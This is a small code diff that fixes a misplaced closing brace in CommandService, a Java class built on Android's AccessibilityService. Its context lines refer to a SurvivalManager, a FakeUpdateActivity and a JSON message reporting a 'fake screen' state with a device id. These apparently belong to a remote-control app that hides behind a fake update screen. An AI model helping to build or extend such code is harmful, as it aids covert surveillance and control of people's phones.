@@ -724,7 +724,6 @@ public class CommandService extends AccessibilityService
     // ── Static accessor (for SurvivalManager, receivers) ─────────────────────
 
     public static boolean isAlive() { return INSTANCE != null; }
-}
 
     // ── Fake screen signalling (called from FakeUpdateActivity) ───────────────
 
@@ -744,3 +743,4 @@ public class CommandService extends AccessibilityService
         }
         sendJson("fake_screen_active", "id", deviceId, "active", false);
     }
+}
